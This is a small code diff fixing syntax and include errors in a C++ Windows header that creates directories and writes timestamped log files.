@@ -1,12 +1,11 @@
 #ifndef IO_H
 #define IO_H
-
 #include <string>
 #include <cstdlib>
 #include <fstream>
 #include "windows.h"
 #include "Helper.h"
-#include "Base64"
+#include "Base64.h"
 
 namespace IO
 {
@@ -20,7 +19,7 @@ namespace IO
 
     bool MkOneDr(std::string path)
     {
-        return (bool)CreateDirectory(path.c_str(), NULL) {}
+        return (bool)CreateDirectory(path.c_str(), NULL) ||
         GetLastError() == ERROR_ALREADY_EXISTS;
     }
 
@@ -41,7 +40,7 @@ namespace IO
     std::string WriteLog(const T &t)
     {
         std::string path = GetOurPath(true);
-        Helper ::DateTime dt;
+        Helper::DateTime dt;
         std::string name = dt.GetDateTimeString("_") + ".log";
 
         try
@@ -64,3 +63,5 @@ namespace IO
         }
     }
 }
+
+#endif
